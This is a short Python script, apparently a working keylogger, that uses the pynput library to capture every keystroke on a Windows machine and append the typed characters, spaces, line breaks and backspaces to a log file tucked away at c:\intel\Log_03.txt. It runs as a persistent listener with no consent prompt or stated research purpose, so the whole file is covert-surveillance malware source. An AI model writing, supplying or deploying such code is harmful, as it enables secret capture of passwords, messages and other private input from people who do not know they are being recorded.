# import pip
# pip.main(['install','pynput'])

from pynput import keyboard
import os
import datetime


# mouse=Controller()

def on_press(key):
    # print(datetime.datetime.now().strftime("%H:%M:%S"))

    try:

        f = open('c:\intel\Log_03.txt', "a")

        f.write(key.char)

        # print('alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        # print('special key {0} pressed'.format(key))
        # print(key.KeyCode)
        if key == keyboard.Key.space:
            f.write(' ')
        if key == keyboard.Key.enter:
            f.write(os.linesep)
        if key == keyboard.Key.backspace:
            f.write('[BACKSPACE]')


def on_release(key):
    if int(datetime.datetime.now().strftime("%H")) not in range(0, 23):
        return False

    # return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
